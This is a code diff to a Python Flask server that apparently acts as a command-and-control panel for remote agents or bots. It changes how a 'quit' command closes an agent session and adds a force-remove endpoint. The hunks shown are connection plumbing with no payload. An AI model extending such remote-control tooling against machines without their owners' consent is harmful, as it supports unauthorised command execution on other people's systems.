@@ -180,23 +180,26 @@ def send_command():
         
         # If command is quit, remove the bot from the list
         if command == 'quit':
-            bot.target.close()
-            del Bot.botList[session_id]
-            logging.info(f"Agent {session_id} terminated")
-            return jsonify({
-                'success': True,
-                'message': 'Agent terminated'
-            })
+            try:
+                # Try to get response but don't wait too long
+                response = bot.reliable_recv(timeout=2)
+            except:
+                response = None
+            finally:
+                bot.target.close()
+                del Bot.botList[session_id]
+                logging.info(f"Agent {session_id} terminated")
+                return jsonify({
+                    'success': True,
+                    'message': 'Agent terminated'
+                })
         
-        # Get response from agent
+        # For other commands...
         response = bot.reliable_recv()
         if response is None:
             raise Exception("No response from agent")
             
-        # Update last seen time
         bot.update_last_seen()
-        
-        # Log command execution
         logging.info(f"Command executed on Session {session_id} ({bot.ip}): {command}")
         
         return jsonify({
@@ -445,6 +448,33 @@ def is_safe_path(path):
     base_dir = os.path.abspath(os.path.dirname(__file__))
     file_path = os.path.abspath(path)
     return base_dir in file_path
+
+@app.route('/api/force_remove_agent', methods=['POST'])
+def force_remove_agent():
+    data = request.get_json()
+    session_id = int(data.get('session_id'))
+    
+    if session_id not in Bot.botList:
+        return jsonify({'error': 'Invalid session ID'}), 400
+        
+    try:
+        # Force close the connection
+        bot = Bot.botList[session_id]
+        bot.target.close()
+        del Bot.botList[session_id]
+        logging.info(f"Agent {session_id} forcefully removed")
+        return jsonify({
+            'success': True,
+            'message': 'Agent forcefully removed'
+        })
+    except Exception as e:
+        logging.error(f"Error forcing removal of agent {session_id}: {e}")
+        # Still try to remove from list even if there's an error
+        if session_id in Bot.botList:
+            del Bot.botList[session_id]
+        return jsonify({
+            'error': f'Force removal failed: {str(e)}'
+        }), 500
 
 if __name__ == '__main__':
     try:
